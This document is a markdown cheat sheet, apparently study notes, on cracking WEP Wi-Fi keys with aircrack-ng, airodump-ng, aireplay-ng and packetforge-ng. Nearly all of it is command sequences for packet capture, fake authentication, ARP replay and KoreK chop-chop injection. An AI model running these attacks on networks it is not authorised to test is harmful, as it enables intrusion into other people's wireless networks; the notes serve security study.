# WIRED EQUIVALENT PRIVACY

### ~ Uses RC4 algorithm 
### ~ Random Initialization vector (IV) is used to generate keys. (24 bits)
### ~ IV + Key (password) = key stream
### ~ IV is sent in plain text and can repeat in busy networks, hence can be used to determine key streams.

## 1. BASIC CASE - BUSY NETWORKS

#### Perform targetted packet sniffing and crack the password using `aircrack-ng`.

> `airodump-ng --bssid <host-mac> -channel <channel> --write <file> wlan0`
> 
> `aircrack-ng <cap file>`

#### More the number of packets captured, higher the chances of password cracking.

## 2. NON BUSY NETWORKS - 

#### Associate with the network and force it to generate packets.
#### Association:
##### Get MAC Address of wireless adapter using `ifconfig` (First 12 characters next to unspec).
> `aireplay-ng --fakeauth 0 -a <host-bssid> -h <adapter-mac> wlan0`

### ~ ARP Request Reply Attack:
#### Wait for an ARP packet to be transmitted from the network and re-transmit it, forcing the AP to generate a new packet with new IV.
> `airodump-ng --bssid <host-mac> -channel <channel> --write <file> wlan0`
> `aireplay-ng --fakeauth 0 -a <host-bssid> -h <adapter-mac> wlan0`
> `aireplay-ng --arpreplay -b <AP-mac> -h <adapter-mac> wlan0`
> `aircrack-ng <cap file>`

### ~ Korek Chop Chop Attack:
#### Try to determine the key stream for a packet, and create a new packet with the key stream. Inject this packet into the traffic, hence forcing the AP to generate a new packet with a new IV.

> `airodump-ng --bssid <host-mac> -channel <channel> --write <file> wlan0`
> 
> `aireplay-ng --fakeauth 0 -a <host-bssid> -h <adapter-mac> wlan0`
> 
> `aireplay-ng --chopchop -b <target-bssid> -h <adapter-mac> wlan0`
> 
> `packetforge-ng -0 -a <target> -h <adapter> -k 255.255.255.255 -l 255.255.255.255 -y <keystreamFile(.xor) -w <1*>`
>  
>  `aireplay-ng -2 -r <2*> wlan0`

#### 1* - Name to save fake packet generated from packetforge.
#### 2* - Name of the packet generated through packetforge.

#### Once number of packets reach around 20,000 from the last command, use `aircrack-ng` to crack the password.
